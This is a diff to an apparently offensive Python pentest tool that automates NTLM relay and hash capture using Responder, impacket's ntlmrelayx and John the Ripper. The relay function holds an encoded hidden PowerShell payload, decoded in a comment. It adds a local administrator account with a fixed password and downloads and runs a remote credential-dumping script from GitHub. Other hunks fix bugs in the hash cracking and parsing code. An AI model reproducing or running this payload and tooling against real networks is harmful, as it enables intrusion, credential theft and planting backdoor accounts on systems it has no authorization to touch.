@@ -675,12 +675,14 @@ def get_cracked_pwds(prev_creds):
     '''
     Check for new cracked passwords
     '''
-    dir_contents = os.listdir(os.getcwd()+'/hashes')
+    hash_folder = os.getcwd()+'/hashes'
+    if os.path.isdir(hash_folder):
+        dir_contents = os.listdir(os.getcwd()+'/hashes')
 
-    for x in dir_contents:
-        if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
-            out = check_output('submodules/JohnTheRipper/run/john --show {}'.format(x).split())
-            prev_creds = parse_john_show(out, prev_creds)
+        for x in dir_contents:
+            if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
+                out = check_output('submodules/JohnTheRipper/run/john --show hashes/{}'.format(x).split())
+                prev_creds = parse_john_show(out, prev_creds)
 
     return prev_creds
 
@@ -719,7 +721,7 @@ def run_relay_attack():
 
 # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
     relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py'
-                ' -of ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt'
+                ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt'
                 ' -c "powershell -nop -exec bypass -w hidden -enc '
                 'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
     ntlmrelay_proc = run_proc(relay_cmd)
@@ -847,10 +849,10 @@ def get_responder_hashes(line, prev_creds):
 
         if user not in prev_creds:
             prev_creds.append(user)
-            print('[+] Hash found! {}'.format(ntlm_hash)
+            print('[+] Hash found for {}!'.format(user))
             if ntlm_hash.count(':') == 5:
                 new_hash = {'NTLMv2':[ntlm_hash]}
-            elif ntlm_hash.count(':' == 4:
+            elif ntlm_hash.count(':') == 4:
                 new_hash = {'NTLMv1':[ntlm_hash]}
 
     return prev_creds, new_hash
@@ -867,9 +869,9 @@ def cleanup_responder(resp_proc, prev_creds):
 
     return prev_creds
 
-def get_user_from_ntlm_hash(ntlmhash):
+def get_user_from_ntlm_hash(ntlm_hash):
     '''
-    Gets the username in form of 'LAB\user' from ntlm hash
+    Gets the username in form of LAB\\uame from ntlm hash
     '''
     hash_split = ntlm_hash.split(':')
     user = hash_split[2]+'\\'+hash_split[0]
@@ -1089,7 +1091,12 @@ def main(report, args):
         try:
             while time.time() < timeout:
                 prev_creds, new_lines = parse_responder_log(args, prev_lines, prev_creds)
+
+                for line in new_lines:
+                    prev_lines.append(line)
+
                 time.sleep(0.1)
+
             prev_creds = cleanup_responder(resp_proc, prev_creds)
 
         except KeyboardInterrupt:
